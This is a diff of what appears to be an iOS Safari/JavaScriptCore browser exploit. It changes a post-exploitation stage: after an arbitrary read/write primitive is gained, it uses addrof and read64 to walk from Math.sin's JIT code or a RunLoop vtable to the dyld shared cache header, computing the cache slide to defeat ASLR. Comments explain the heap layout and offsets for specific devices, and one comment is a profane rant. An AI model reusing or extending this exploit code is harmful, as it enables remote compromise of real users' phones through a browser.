@@ -623,178 +623,32 @@ for (var i = 0; i < 1000; ++i) {
         },
     };
     print("we have arbitrary r/w with JSArray :)");
-    // A marked block is a page-aligned container for heap-allocated objects.
-// Objects are allocated within cells of the marked block. For a given
-// marked block, all cells have the same size. Objects smaller than the
-// cell size may be allocated in the marked block, in which case the
-// allocation suffers from internal fragmentation: wasted space whose
-// size is equal to the difference between the cell size and the object
-// size.
-    var bb = {}; //allocate an object jsc will place it within cell of the MarkedBlock
-        //bb[0] = 1.1
-        var bbaddr = stage2.addrof(bb); //find the address of said object
-        print("object address @ " + hex1(bbaddr));
-    /*static constexpr size_t atomSize = 16; // bytes
-
-    // Block size must be at least as large as the system page size.
-    static constexpr size_t blockSize = std::max(16 * KB, CeilingOnPageSize);
-
-    static constexpr size_t blockMask = ~(blockSize - 1); // blockSize must be a power of two.
-
-    static constexpr size_t atomsPerBlock = blockSize / atomSize;
-
-    static constexpr size_t maxNumberOfLowerTierCells = 8;
-    static_assert(maxNumberOfLowerTierCells <= 256);
-    
-    static_assert(!(MarkedBlock::atomSize & (MarkedBlock::atomSize - 1)), "MarkedBlock::atomSize must be a power of two.");
-    static_assert(!(MarkedBlock::blockSize & (MarkedBlock::blockSize - 1)), "MarkedBlock::blockSize must be a power of two.");*/      
-    /*private:
-    Footer& footer();
-    const Footer& footer() const;
-
-public:
-    static constexpr size_t endAtom = (blockSize - sizeof(Footer)) / atomSize;
-    static constexpr size_t payloadSize = endAtom * atomSize;
-    static constexpr size_t footerSize = blockSize - payloadSize;
-
-    static_assert(payloadSize == ((blockSize - sizeof(MarkedBlock::Footer)) & ~(atomSize - 1)), "Payload size computed the alternate way should give the same result");*/
-	//What we are About to calculate is JSC::MarkedBlock::Footer
-	      
-	var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
-	//turns out on iphone6s its not 0x130 its actually 0x128
-	//var footeraddy = ((blockSize - 0x130)) & ~(atomSize - 1))
-	
-        //refer to VM.h this is
-        //JSC::MarkedBlock::footer at offset 8 should be the vm struct
-        print("footeraddr @ " + hex1(footeraddr));
-        var vmstruct = stage2.read64(footeraddr+0x08); 
-	/*MarkedBlock::~MarkedBlock()
-{
-    footer().~Footer();
-}
-
-MarkedBlock::Footer::Footer(VM& vm, Handle& handle)
-    : m_handle(handle) 0x0-0x8
-    , m_vm(&vm)  0x8 - 0x10 this is what we need
-    , m_markingVersion(MarkedSpace::nullVersion)
-    , m_newlyAllocatedVersion(MarkedSpace::nullVersion)
-{*/
-        print("vmstruct @ " + hex1(vmstruct));
-	/*VM::VM(VMType vmType, HeapType heapType, WTF::RunLoop* runLoop, bool* success)
-    : m_id(nextID()) 0x0-x8
-    , m_apiLock(adoptRef(new JSLock(this))) 0x8-x10
-    , m_runLoop(runLoop ? *runLoop : WTF::RunLoop::current()) 0x10 - 0x18
-    , m_random(Options::seedOfVMRandomForFuzzer() ? Options::seedOfVMRandomForFuzzer() : cryptographicallyRandomNumber())
-    , m_integrityRandom(*this)*/
-	      
-        //var structdump = stage2.read(vmstruct,0x30);
-        var m_runloop = stage2.read64(vmstruct+0x10); 
-        //Ref <WTF::RunLoop> m_runLoop; at offset 0x10-0x18 proceeded by m_random
-        print("m_runloop @ " + hex1(m_runloop));
-	//stage2.write64(m_runloop,0x5151515151);
-        //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
-	/* 
-	How do one know what a vtable looks like well anything in C++ starting with "class *name*" is automatically making a table of functions
-	so once completed the compiler adds an invisible pointer at the very beginning of the table which just points back to the table itself
-	the table is a table of virtual functions hence why its a vtable, the invisible pointer i was referencing is called vptr or sometimes in certain 
-	disassemblers they call it __vfptr usually sitting at offset 0
-class Base
-{
-public:
-    VirtualTable* __vptr;
-    virtual void function1() {};
-    virtual void function2() {};
-};
-
-class D1: public Base
-{
-public:
-    virtual void function1() {};
-};
-
-class D2: public Base
-{
-public:
-    virtual void function2() {};
-};*/
-	     //look further down
-	      
-	      /*
-	// Helper class for ThreadSpecificData.
-class RunLoop::Holder {
-    WTF_MAKE_FAST_ALLOCATED;
-public:
-    //this was added by me invisible pointer would be
-    RunLoop* __vptr;
-    Holder() 0x0 - 0x8
-        : m_runLoop(adoptRef(*new RunLoop))
-    {
-    }
-
-    ~Holder() 0x8 - 0x10
-    {
-        m_runLoop->threadWillExit();
-    }
-
-    RunLoop& runLoop() { return m_runLoop; }
-
-private:
-    Ref<RunLoop> m_runLoop;
-}
-*/
-	      
-        var vtable = stage2.read64(m_runloop); //__ZTVN3WTF7RunLoopE read at offset 0 for vtable address
-        print("vtable @ " + hex1(vtable));
-	var anchor = stage2.read64(vtable);
-	var conversion_buffer = new ArrayBuffer(8)
-var f64 = new Float64Array(conversion_buffer)
-var i32 = new Uint32Array(conversion_buffer)
-
-var BASE32 = 0x100000000
-function f2i(f) {
-    f64[0] = f
-    return i32[0] + BASE32 * i32[1]
-}
-
-function i2i(i,num) {
-    i32[0] = i % BASE32
-    i32[1] = i / BASE32
-    return i32[num]
-}
-    var hdr = anchor - (i2i(anchor,0) & 0xffffff);
-    print("header" + hex1(hdr));
-   /* imp___stubs__atan2:        // atan2
-0000000189fccfbc         adrp       x16, #0x1dafc1000                           ; 0x1dafc1668@PAGE  this is lazy symbol pointer
-0000000189fccfc0         ldr        x16, [x16, #0x668]                          ; 0x1dafc1668@PAGEOFF, _atan2_ptr,_atan2
-0000000189fccfc4         br         x16                                         ; _atan2
-                        ; endp
-			*/
-	      var atan_lazy_ptr = 0x1dafc1668; //this is unslid need to cache slide
-	      /*                     __ZTVN3WTF7RunLoopE:        // vtable for WTF::RunLoop
-00000001daffd658         db  0x00 ; '.' */
-	      var unslidvtable = 0x1daffd658;
-	      var cacheslide = vtable - unslidvtable;
-	      print("cache slide" + hex1(cacheslide));
-	      if (cacheslide > 0x2F8A0000) {
-		      print("cache slide is larger than 0x2F8A0000 fail!!!")
-		      //Max Slide         = 0x2F8A0000 (ASLR entropy: 16-bits)
-	      }
-	      print("vtable dump" + hexdump(stage2.read(vtable,0x30)))
-	      print("JSC __TEXT Base? @ " + hex1(hdr) + "hexdump : " + hexdump(stage2.read(hdr, 0x100)));
-	      print("base CharCode" + String.fromCharCode(...stage2.read(hdr, 0x100)))
-	      while(true)
+    memory = stage2;
+	var sinFuncAddr = memory.addrof(Math.sin);
+        
+        var executableAddr = memory.read64(sinFuncAddr+24);
+       
+        var jitCodeAddr = memory.read64(executableAddr+24);
+        print("jit @ " + jitCodeAddr)
+        
+        var vtab = memory.read64(jitCodeAddr);
+        print("vtab @ " + vtab)
+        var anchor1 = memory.read64(vtab,0)
+        print("anchor1" + anchor1);
+        var jsc = Sub(anchor1, anchor1.lo() & 0xfff);
+	print('JSC header @' + jsc); //dyld_cache_header
+        while(true)
         {
         /*FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...*/
-        if(strcmp(stage2.read(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
+        if(strcmp(memory.read(jsc, 0x10), "dyld_v1   arm64")) //cache header magic
         //webcore header magic...
         {
-            print("addr : " + hex1(hdr) + String.fromCharCode(...stage2.read(hdr, 0x10)))
+            print("found it @ " + jsc + ":" + String.fromCharCode(...memory.read(jsc, 0x10)))
             break;
         }
-        hdr = i2i(hdr,0) - 0x1000;
+        jsc = Sub(jsc, 0x1000);
         }
-	     /* var cachestart = 0x180000000 + cacheslide; //Shared Region:                    4GB, address: 0x180000000 -> 0x280000000
-	      print("cachedump @ " + hex1(cachestart) + " : " + String.fromCharCode(...stage2.read(cachestart,0x100)));*/
+	      
 	
 
       }
